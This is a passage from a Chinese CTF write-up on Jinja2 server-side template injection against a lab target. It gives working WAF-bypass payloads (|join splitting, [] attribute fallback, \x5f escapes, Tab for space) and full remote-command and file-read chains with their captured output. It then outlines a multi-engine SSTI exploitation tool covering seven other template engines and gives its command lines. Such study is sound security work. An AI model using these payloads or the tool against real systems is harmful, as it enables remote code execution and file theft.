本案例与第13章的区别：第13章过滤了 `_`、`'`、`[`，但 `~` 和 `attr` 可用；本案例相反，`~` 和 `attr` 被过滤，但 `'` 和 `[]` 可用。因此绕过思路完全不同。

**1. `|join` 替代 `~` 拼接**

当 `attr`/`getattr` 被过滤时，需要用 `obj|attr('name')` 的替代方案。而 `attr` 关键字本身被过滤，只能回退到 `.` 和 `[]` 访问属性。但 `globals`/`popen` 等属性名也被过滤，需要拼接：

```jinja2
# ~ 被过滤，用 |join 拼接被过滤的属性名
['o','s']|join          → 'os'
['po','pen']|join       → 'popen'
['__glo','bals__']|join → '__globals__'
```

**2. `[]` getattr fallback 替代 `|attr`**

Jinja2 中 `obj[key]` 对不支持 `__getitem__` 的对象会 fallback 到 `getattr(obj, key)`，因此 `obj['attr_name']` 等价于 `obj|attr('attr_name')`：

```jinja2
# attr 被过滤，用 [] 访问属性
lipsum['__globals__']           → globals dict  (等价 lipsum|attr('__globals__'))
globals['os']                   → os module
os['popen']('id')['read']()     → 命令输出
```

**3. 组合：`[]` + `|join` 拼接被过滤的属性名**

属性名含被过滤关键字时，用 `|join` 构建属性名字符串，再用 `[]` 访问：

```jinja2
# __globals__ 被过滤(Globals)，用 |join 构建
lipsum[['__glo','bals__']|join]
```

**4. Tab 替代空格**

空格被过滤但 Tab(`%09`) 可用，命令中用 `%09` 替代空格：

```
cat /flag    → 被 WAF 拦截（空格 + cat 关键字）
tac%09/flag  → 通过（Tab 分隔 + tac 替代 cat）
```

### 14.4 完整利用链

**RCE 执行命令（策略 11）**：

```jinja2
# 1. 通过 lipsum 获取 globals
# 2. 通过 globals 获取 os 模块（os 关键字用 |join 拼接绕过）
# 3. 通过 os 调用 popen（popen 关键字用 |join 拼接绕过）
# 4. 通过 file 对象调用 read（read 不被过滤，直接用 []）

{{lipsum[['__glo','bals__']|join][['o','s']|join][['po','pen']|join]('id')[['re','ad']|join]()}}
```

**读取 flag 文件（策略 12 = 策略 11 + Tab 替代空格）**：

```jinja2
# cat 被过滤，用 tac 替代；空格被过滤，用 Tab 替代
{{lipsum[['__glo','bals__']|join][['o','s']|join][['po','pen']|join]('tac\t/flag_in_h3r3_52daad')[['re','ad']|join]()}}
```

### 14.5 实测结果（自动化工具验证）

```
# --exec "id" → 策略 11 自动命中
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# --read /flag_in_h3r3_52daad → 策略 12 自动命中
CTF2{a0d40185-5da1-42c0-bf04-fc0349c0ca2b}

# --info → 自动枚举目录 + 读取 flag
[+] System info: Linux ... Docker container
[+] Flag: CTF2{a0d40185-5da1-42c0-bf04-fc0349c0ca2b}
```

### 14.6 关键经验

1. **`|join` 是 `~` 的完美替代**：当 `~` 被过滤但 `|join` 可用时，`['part1','part2']|join` 可拼接任意被过滤的关键字
2. **`[]` getattr fallback 是 `|attr` 的完美替代**：Jinja2 的 `obj[key]` 会 fallback 到 `getattr`，无需 `attr` filter
3. **攻防对称性**：第13章与本章互为镜像 — 一个过滤 `attr`/`~`，另一个过滤 `_`/`[`/`'`。不同过滤组合需不同的拼接 + 访问策略
4. **`tac` 替代 `cat`**：WAF 常按关键字过滤命令名，`tac`（反向 cat）功能等价且通常不在黑名单
5. **Tab 是空格的通用替代**：`%09` 在大多数 WAF 中不被拦截，适用于命令参数分隔
6. **探测逻辑修正**：WAF 探测时不能依赖被过滤关键字进行测试（如用 `lipsum.__globals__` 测下划线会被 `globals` 关键字干扰），需选用不含被过滤词的特征函数如 `__doc__`/`__name__`
7. **策略匹配用 `issubset`**：工具自动选择绕过策略时，必须确保策略要求的 filters 是实际 WAF filters 的子集，而非交集大小比较

---

## 第15章 |join 拼接 + \x5f 十六进制转义（下划线也被过滤的极端场景）

### 15.1 场景概述

**靶机**：DASCTF CTF2 NewStarCTF Again And Again（第三阶段升级 WAF）
**注入点**：GET `name` 参数，Jinja2 SSTI
**Flag**：`CTF2{93657186-0a0d-4345-bdcd-218d909ec8a0}`（文件 `/flag_in_h3r3_52daad`）

本章是第14章的进阶 — 在第14章的 WAF 基础上**新增过滤了下划线 `_`**，使得第14章的 `['__glo','bals__']|join` 直接失败（`__` 含 `_`）。

### 15.2 WAF 过滤规则

| 字符/关键字 | 状态 | 说明 |
|---|---|---|
| 空格 ` ` | 被过滤 | 用 Tab(`%09`) 替代 |
| 波浪号 `~` | 被过滤 | 用 `|join` 替代拼接 |
| 下划线 `_` | **被过滤** | 用 `\x5f` 十六进制转义替代（核心技术） |
| `attr` | 被过滤 | 用 `[]` getattr fallback 替代 |
| `request` | 被过滤 | request.args 传参法不可用 |
| 15个关键字 | 被过滤 | 子串匹配：globals/builtins/import/os/popen/system/eval/environ/flag/cat/class/mro/subclasses/init/attr |

**可用字符**：`.`（点号）、`[]`（方括号）、`'`（单引号）、`|`（管道）、`,`（逗号）、`()`（括号）、Tab(`%09`)
**可用全局对象**：`lipsum`/`cycler`/`joiner`/`namespace`、`open`/`read`

### 15.3 核心突破技术：`\x5f` 十六进制转义

**问题**：下划线 `_` 被 WAF 过滤，所有 `__globals__`/`__builtins__`/`__import__` 等双下划线属性都无法直接写入 payload。第14章的 `|join` 拆分（如 `['__glo','bals__']|join`）也失败，因为每个段仍含 `_`。

**突破**：Jinja2 单引号字符串中支持十六进制转义，`\x5f` 被解析为下划线 `_`。但 WAF 只看到 `\x5f` 四个 ASCII 字符（`\`、`x`、`5`、`f`），不含 `_` → 绕过下划线过滤。

```jinja2
# Jinja2 解析: '\x5f\x5fglobals\x5f\x5f' → '__globals__'
# WAF 看到的: \x5f\x5fglobals\x5f\x5f  (不含 _ 字符)

# 组合 |join 拆分被过滤关键字（globals 被过滤）：
['\x5f\x5fglo','bals\x5f\x5f']|join
# Jinja2 解析: '__glo' + 'bals__' = '__globals__'
# WAF 看到的: '\x5f\x5fglo' 和 'bals\x5f\x5f' (不含 _ 也不含 globals)
```

**Python 代码关键陷阱**：
- Python 中 `'\\x5f'`（双反斜杠）发送字面4字符 `\x5f` — 这是正确的
- Python 中 `'\x5f'`（单反斜杠）发送实际 `_` 字符 — 会被 WAF 拦截
- 工具代码中必须用 `'\\x5f'`

### 15.4 完整利用链

**RCE 执行命令**（`.read()` 用点号访问，因为 `.` 可用）：

```jinja2
# 利用链: lipsum → __globals__ → __builtins__ → __import__('os') → popen(cmd) → .read()

{{lipsum[['\x5f\x5fglo','bals\x5f\x5f']|join][['\x5f\x5fbui','ltins\x5f\x5f']|join][['\x5f\x5fimp','ort\x5f\x5f']|join](['o','s']|join)[['po','pen']|join]('id').read()}}
```

**文件读取**（`flag` 关键字用 `|join` 拆成 `fl`+`ag`，`_` 用 `\x5f`，`open().read()` 用点号）：

```jinja2
# 利用链: lipsum → __globals__ → __builtins__ → open(filepath) → .read()
# filepath 中 flag 拆为 fl+ag，_ 替换为 \x5f

{{lipsum[['\x5f\x5fglo','bals\x5f\x5f']|join][['\x5f\x5fbui','ltins\x5f\x5f']|join]['open'](['/','fl','ag\x5fin\x5fh3r3\x5f52daad']|join).read()}}
```

### 15.5 `open().read()` vs `['read']()` 的区别

| 对象类型 | `[]` getattr fallback | `.read()` 点号访问 |
|---|---|---|
| `os.popen()` 返回的对象 | 可用 | 可用 |
| `open()` 返回的 file object | **不可用**（500 错误） | 可用 |

因此当点号可用时，RCE 和文件读取都应使用 `.read()`。工具通过 `dot_available` 参数控制：
- `dot_available=True` → `.read()`
- `dot_available=False` → `[['re','ad']|join]()`

### 15.6 实测结果（自动化工具验证）

```
# --exec "id" → 策略 13 自动命中（\x5f 转义 + Tab 替代空格）
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root)

# --read /flag_in_h3r3_52daad → open().read() 自动构造
CTF2{93657186-0a0d-4345-bdcd-218d909ec8a0}

# --info → 自动枚举目录 + 发现 flag 文件
[1] 系统信息: uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root)
[3] 根目录: app bin boot dev ... flag_in_h3r3_52daad ... var
[+] /flag_in_h3r3_52daad: CTF2{93657186-0a0d-4345-bdcd-218d909ec8a0}
```

### 15.7 关键经验

1. **`\x5f` 是下划线过滤的终极绕过**：Jinja2 单引号字符串支持 `\xHH` 十六进制转义，WAF 只看到 ASCII 字符而非解析后的字符。同理 `\x2e` 可绕过点号过滤，`\x5b`/`\x5d` 可绕过方括号过滤
2. **`\x5f` + `|join` 组合拳**：`\x5f` 解决字符级过滤，`|join` 解决关键字级过滤，两者组合可绕过字面量中的所有过滤
3. **Python 转义陷阱**：Python 代码中 `'\x5f'` 会被 Python 解析为 `_`，必须用 `'\\x5f'` 才能发送字面4字符
4. **`open().read()` 优于 `os.popen()`**：文件读取用 `open().read()` 更简洁，且避免了 `os`/`popen` 关键字。但 file object 的 `[]` 访问不可用，必须用 `.read()`
5. **三层防线递进**：第14章（`|join` + `[]` fallback）→ 本章（`|join` + `[]` fallback + `\x5f` 转义）→ 若未来点号也被过滤（`\x2e` 转义 + `[]` fallback for read）
6. **工具自动化设计**：`_build_rce_payload` 和 `_build_file_payload` 通过 `'_insubset' in self.waf_filters` 和 `'notinsubset' in self.waf_filters` 自动检测，无需手动指定策略号


---

## 第16章 多引擎架构：从 Jinja2 专用到 8 引擎通用

> 补充日期：2026-08-08
> 工具版本：`web_ssti_toolkit.py` v2.0 多引擎模块化架构

### 16.1 架构演进

原始版本 (`v1.x`) 所有逻辑写在单文件 `web_ssti_toolkit.py`（2115 行），Jinja2 硬编码在核心逻辑中，其他引擎只有静态 payload 列表。

重构后 (`v2.0`) 采用模块化设计：

```
Web/tools/
├── web_ssti_toolkit.py          # 主文件（~550行，通用框架）
└── ssti_engines/                 # 引擎模块包
    ├── __init__.py               # 引擎注册表 + DETECT_PAYLOADS + ENGINE_FINGERPRINTS
    ├── base.py                   # BaseEngine 基类（统一接口）
    ├── utils.py                  # 共享工具函数（clean_response, is_waf_blocked）
    ├── jinja2_engine.py          # Jinja2（14种绕过策略 + WAF探测 + 信息收集）
    ├── twig_engine.py            # Twig（map/filter/sort/reduce 回调绕过）
    ├── smarty_engine.py          # Smarty（{if} 标签多函数变体绕过）
    ├── freemarker_engine.py      # FreeMarker（?new/?api + ObjectConstructor 绕过）
    ├── velocity_engine.py        # Velocity（反射链 + #set 变量拼接绕过）
    ├── thymeleaf_engine.py       # Thymeleaf（SpEL 注入 + 空格绕过）
    ├── mako_engine.py            # Mako（原生代码块，无沙箱）
    └── tornado_engine.py         # Tornado（handler.settings 泄露 + __import__ 链）
```

### 16.2 BaseEngine 统一接口

每个引擎继承 `BaseEngine`，实现以下接口：

| 属性/方法 | 说明 |
|-----------|------|
| `name` | 引擎标识 |
| `template_tags` | 模板标签元组 |
| `error_keywords` | 引擎特有错误关键词 |
| `detect_payloads` | 检测 payload 列表 |
| `fingerprints` | 引擎指纹列表 |
| `rce_chains` | RCE 利用链（含 CMD 占位符） |
| `file_read_chains` | 文件读取链（含 FILEPATH 占位符） |
| `bypass_strategies` | WAF 绕过策略列表 |
| `probe_waf(toolkit)` | WAF 探测，返回 (filters, filtered_keywords) |
| `build_rce_payload(cmd, toolkit)` | 构造 RCE payload，返回 (payload, extra_params) |
| `build_file_payload(filepath, toolkit)` | 构造文件读取 payload |
| `is_rce_output(text, cmd, toolkit)` | 判断 RCE 输出有效性 |
| `info_gathering(toolkit)` | 信息收集 |
| `probe_attack_surface(toolkit)` | 攻击面探测 |
| `select_bypass(waf_filters)` | 绕过策略匹配（基类已有默认实现） |
| `sanitize_cmd_for_space(cmd, waf_filters)` | 空格替代（基类已有默认实现） |
| `sanitize_cmd_for_keywords(cmd, filtered_keywords)` | 关键字替代（基类已有默认实现） |

### 16.3 引擎功能对比

| 引擎 | 检测 | WAF探测 | 绕过策略 | RCE链 | 文件读取 | 信息收集 |
|------|------|---------|----------|-------|---------|---------|
| Jinja2 | 完整 | 完整(字符+关键字) | 14种 | 9条 | 3条 | 5项 |
| Twig | 完整 | PHP函数名+语法 | 3种 | 6条 | 1条 | 3项 |
| Smarty | 完整 | PHP函数名+{if}标签 | 2种 | 4条 | 1条 | 3项 |
| FreeMarker | 完整 | Execute/assign/include | 2种 | 3条 | 1条 | 3项 |
| Velocity | 完整 | Runtime/exec/forName | 2种 | 2条 | 1条 | 3项 |
| Thymeleaf | 完整 | Runtime/exec/Scanner | 2种 | 3条 | 1条 | 3项 |
| Mako | 完整 | import/os/popen/open | 1种 | 3条 | 1条 | 3项 |
| Tornado | 完整 | import/handler/subclasses | 2种 | 3条 | 2条 | 5项 |

### 16.4 各引擎 RCE 核心技术

**Jinja2 (Python/Flask)**
- `lipsum.__globals__.os.popen()` 全局函数链
- `|attr()` 替代下划线/点号
- `['p1','p2']|join` 拆分被过滤关键字
- `\x5f` 十六进制转义下划线

**Twig (PHP/Symfony)**
- 1.x/2.x: `_self.env.registerUndefinedFilterCallback("exec")`
- 3.x: `map`/`filter`/`sort`/`reduce` 回调法（函数名作为字符串参数，天然绕过关键字过滤）

**Smarty (PHP)**
- `{if system("id")}{/if}` 标签支持全部 PHP 函数
- 函数名变体: system/passthru/exec/shell_exec 互为替代

**FreeMarker (Java/Spring)**
- `?new()` 实例化 `Execute` 类
- `ObjectConstructor` 替代被过滤的 `Execute`
- `?api` 访问 Java API

**Velocity (Java/Apache)**
- 反射链: `getClass().forName("java.lang.Runtime")`
- `#set($r="java.lang.Ru"+"ntime")` 变量拼接分解关键字

**Thymeleaf (Java/Spring Boot)**
- `__${T(java.lang.Runtime).getRuntime().exec()}__` SpEL 预处理
- `T (java.lang.Runtime)` 空格绕过正则过滤

**Mako (Python)**
- `${__import__("os").popen().read()}` 无沙箱限制
- `<% %>` 原生 Python 代码块

**Tornado (Python)**
- `{% import os %}{{ os.popen().read() }}` 原生 import 指令
- `{{handler.settings}}` 泄露 cookie_secret（经典考点）

### 16.5 引擎识别差异表

| 检测 payload | Jinja2 | Twig | Smarty | FreeMarker | Velocity | Thymeleaf | Mako | Tornado |
|-------------|--------|------|--------|------------|----------|-----------|------|---------|
| `{{7*7}}` → 49 | ✓ | ✓ | - | - | - | - | - | ✓ |
| `{{7*'7'}}` → 7777777 | ✓ | - | - | - | - | - | - | - |
| `{{7*'7'}}` → 49 | - | ✓ | - | - | - | - | - | - |
| `{7*7}` → 49 | - | - | ✓ | - | - | - | - | - |
| `${7*7}` → 49 | - | - | - | ✓ | - | - | ✓ | - |
| `__${7*7}__` → 49 | - | - | - | - | - | ✓ | - | - |
| `#set($a=7*7)$a` → 49 | - | - | - | - | ✓ | - | - | - |

关键区分: `{{7*'7'}}` 在 Jinja2 中返回 `7777777`（字符串重复），在 Twig 中返回 `49`（数学运算）。

### 16.6 主文件瘦身效果

| 指标 | v1.x (单体) | v2.0 (模块化) |
|------|------------|--------------|
| 主文件行数 | 2115 行 | ~550 行 |
| 引擎数据位置 | 硬编码在主文件 | ssti_engines/ 包内 |
| 新增引擎方式 | 修改主文件多处 | 新建一个 .py 文件 + 注册一行 |
| Jinja2 绕过策略 | 14种（内置） | 14种（jinja2_engine.py） |
| 支持引擎数 | 6个（Jinja2完整+5个仅静态链） | 8个（全部有WAF探测+绕过+信息收集） |

### 16.7 使用方式（不变）

```bash
# 工具自动检测引擎
python web_ssti_toolkit.py -u "http://target/?name=test" --param name

# 指定 Thymeleaf 引擎
python web_ssti_toolkit.py -u "http://target/" --param fragment --engine thymeleaf --exec "id"

# Tornado 引擎 WAF 探测
python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine tornado --waf

# 速查表
python web_ssti_toolkit.py cheatsheet
```

CLI `--engine` 现支持: `jinja2, twig, smarty, freemarker, velocity, thymeleaf, mako, tornado`

### 16.8 扩展新引擎

添加新引擎只需 3 步：

1. 创建 `ssti_engines/new_engine.py`，定义 `NewEngine(BaseEngine)` 类
2. 在 `ssti_engines/__init__.py` 中 import + 注册到 `ENGINE_REGISTRY`
3. 完成 — `DETECT_PAYLOADS`、`ENGINE_FINGERPRINTS`、`SUPPORTED_ENGINES` 自动更新

```

> AI生成